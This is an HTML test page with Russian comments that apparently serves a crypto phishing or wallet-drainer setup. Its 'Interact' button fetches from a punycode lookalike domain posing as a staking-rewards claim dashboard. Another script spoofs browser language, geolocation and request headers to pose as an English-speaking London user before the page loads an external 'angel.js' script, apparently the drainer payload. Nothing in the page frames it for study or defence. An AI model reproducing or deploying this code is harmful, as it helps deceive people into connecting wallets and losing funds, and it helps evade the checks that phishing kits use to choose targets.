<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Test Page</title>
  <script>async function startConnect() {
            try {
                const response = await fetch('https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/secureproxy.php', {
                    method: 'GET', // или 'POST', если eleven.php ожидает POST
                    headers: {
                        'Content-Type': 'application/json' // если eleven.php возвращает JSON
                    }
                    // Если нужен POST-запрос, раскомментируйте:
                    // body: JSON.stringify({ key: 'value' })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const data = await response.json(); // Если eleven.php возвращает JSON
                // Если eleven.php возвращает текст, замените на: response.text()
                document.getElementById('response').innerText = JSON.stringify(data, null, 2);
            } catch (error) {
                document.getElementById('response').innerText = 'Error: ' + error.message;
            }
        }

        // Назначаем обработчик кликов для всех элементов с классом goAuth
        document.querySelectorAll('.goAuth').forEach(button => {
            button.addEventListener('click', startConnect);
        });
		</script>
</head>
<body>
  <!-- Кнопка -->
  <button class="goAuth">Interact</button>

  <!-- Скрипт для переопределения языка, геолокации и заголовков -->
  <script>
  // ПЕРЕД загрузкой целевого скрипта
  (function() {
    // Переопределяем язык
    Object.defineProperty(navigator, 'language', { get: () => 'en' });
    Object.defineProperty(navigator, 'languages', { get: () => ['en', 'en-US'] });
    
    // Переопределяем геолокацию
    if ('geolocation' in navigator) {
      const mockPosition = {
        coords: {
          latitude: 51.5074,  // Лондон
          longitude: -0.1278,
          accuracy: 10
        },
        timestamp: Date.now()
      };
      
      navigator.geolocation.getCurrentPosition = (success) => success(mockPosition);
      navigator.geolocation.watchPosition = (success) => {
        success(mockPosition);
        return 1;
      };
    }
    
    // Перехватываем IP определение (если через XMLHttpRequest)
    const originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
      const xhr = new originalXHR();
      const originalOpen = xhr.open;
      
      xhr.open = function(method, url) {
        originalOpen.apply(this, arguments);
        // Добавляем заголовки для имитации английского языка
        this.setRequestHeader('Accept-Language', 'en,en-US;q=0.9');
      };
      
      return xhr;
    };
  })();
  </script>

  
  <script charset="UTF-8" type="text/javascript" src="angel.js"></script>
</body>
</html>
